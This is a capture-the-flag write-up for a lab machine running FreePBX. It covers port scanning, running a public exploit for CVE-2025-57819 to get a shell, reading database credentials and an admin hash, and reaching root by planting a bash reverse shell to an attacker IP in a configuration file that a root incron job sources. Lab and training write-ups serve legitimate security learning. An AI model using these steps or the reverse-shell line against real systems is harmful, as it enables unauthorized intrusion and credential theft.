
# CTF Writeup: Connection

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.129.14.9
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 13:16 -0500
Nmap scan report for 10.129.14.9
Host is up (0.036s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 149.02 seconds
```

An more detailled scan revealed further information about the services.

```
nmap -n -Pn -sSCV -p 22,80,443 10.129.14.9
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 13:19 -0500
Nmap scan report for 10.129.14.9
Host is up (0.025s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.33 seconds
```

The nmap scan reveals information about an failed redirect to an potentially internal domain "connected.htb". Let's map the target ip to this domain in our local dns file!

```
echo "10.129.14.9 connected.htb" | tee -a /etc/hosts
```

Upon accessing the domain we are immediatly greeted with an /admin endpoint and an login functionality. We also get information about the running application called "freePBX" with version 16.0.40.7

We googled for any interesting Exploits and found CVE-2025-57819 which should allow us to get command execution.

Searched up for PoC's on GitHub and found:

```
git clone https://github.com/b4sh2/CVE-2025-57819-poc
```

Ran the exploit and gained RCE as user "asterisk".

```
python3 exploit.py connected.htb -p 443
```

Retrieved user.txt in /home/asterisk directory.

```
bb72ae7156ed3df7d537dd62c7e1a4a2
```
## Privilege Escalation

Enumerated privileges and directories but couldn't find anything interesting for now.

Enumerating internally running services of the target server was interesting. There seems to be an internally running MySQL Database, an service on port 4000, an service on port 6379 and port 5038.

Let's search up the web-root for database credentials.

Searched up where FreePBX stores credentials.

```
/etc/freepbx.conf
```

Gained Database Credentials!

```
freepbxuser:mZzDpAGKTmPJ
```

Performed Shell Hardening.

```
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Connected to the internally running MySQL Database.

```
mysql -u freepbxuser -p
Password:mZzDpAGKTmPJ
```

Gained MySQL Shell.

```
show databases;
use asterisk;
show tables;
```

This query provided us with admin credentials.

```
SELECT * FROM ampusers;
```

```
admin:05c689686a4fad5ce3ec76e7ae5708b1fe2da43a
```

The other database "asteriskcdrdb" seemed like an dead-end.

This seemed to be an dead-end!

I decided to proceed with enumerating incron.

```
cat /etc/incron.d/*

/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
```

The output shows the tasks that the system has been configured to run automatically in response to specific file system changes.

The format is:

```
<watched_path> <event> <command_to_run>
```

All of these jobs run as root because they are defined in the system-wide directory /etc/incron.d/ (owned by root).

2. Analyze the script

Does it execute any binaries?

```
cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

3. Analyze /etc/init.d/dahdi

It revealed an /etc/dahdi/init.conf file which is writabel

```
cat /etc/init.d/dahdi
```

or enumerate writable system configuration files

```
find /etc -writable 2>/dev/null
```

The chain is:

```
touch /var/spool/asterisk/sysadmin/dahdi_restart
  → incrond (root) fires sysadmin_dahdi_restart
    → /etc/init.d/dahdi restart (root)
      → sources /etc/dahdi/init.conf
        → our payload runs as root
```

3. The file /etc/dahdi/init.conf is writable by the current user, which means we can inject an reverse shell inside and trigger the incron job.

```
echo 'bash -i >& /dev/tcp/10.10.14.57/9002 0>&1' >> /etc/dahdi/init.conf
```

4. Start up netcat listener on local machine.

```
nc -lvnp 9002
```

5. Trigger the incron ruleset

```
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

Gained RCE as user "root".

```
nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.56.165] 58288
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:22:FF:91 | 10.129.56.165             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[root@connected /]#
```

Retrieved root.txt in /root directory.

```
ae83fc62e79459925511d75669ece11e
```